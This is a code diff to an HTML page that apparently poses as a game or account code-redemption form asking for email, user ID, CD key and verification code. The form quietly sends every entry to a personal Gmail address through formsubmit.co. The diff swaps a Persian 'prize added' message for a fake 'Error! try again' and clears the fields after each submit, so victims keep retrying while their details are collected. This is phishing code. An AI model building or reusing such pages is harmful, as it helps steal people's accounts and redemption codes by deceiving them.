@@ -30,8 +30,8 @@
         .input-field-wrapper { position: relative; }
         .eye-icon { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); cursor: pointer; width: 24px; height: 24px; color: #fff; }
         .eye-icon:hover { color: #00ff00; }
-        .success-msg { color: #ff0000; font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
-        .btn_yellow { width: 100%; cursor: pointer; }
+        .success-msg { color: #00ff00; font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
+        .btn_yellow { width: 80%; cursor: pointer; }
         iframe { display: none !important; width: 0; height: 0; border: 0; }
     </style>
 </head>
@@ -55,7 +55,7 @@
 <div class="code_ct">
     <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
 
-    <form action="https://formsubmit.co/erfanto1177899@gmail.com" method="POST" target="dummyframe" onsubmit="return showSuccess()">
+    <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="dummyframe" onsubmit="return showSuccess()">
         <ul class="code_list c">
             <li>
                 <span class="desktop_label">Email</span>
@@ -88,7 +88,7 @@
 
         <button type="submit" class="btn_yellow" id="label_submit">Submit</button>
         <div id="result" class="success-msg">
-            کد با موفقیت ریدیم شد! جایزه به حساب شما اضافه شد.
+            Error! try again
         </div>
     </form>
 </div>
@@ -126,12 +126,14 @@
             }
         }
 
-function showSuccess() {
-    document.getElementById("result").style.display = "block";
-    return true;
-}
+        function showSuccess() {
+            document.getElementById("result").style.display = "block";
+            // پاک کردن فیلدها
+            document.getElementById("F_UID").value = "";
+            document.getElementById("F_CDKEY").value = "";
+            document.getElementById("F_VCODE").value = "";
+            return true; // اجازه ارسال بده
+        }
     </script>
 </body>
 </html>
-
-
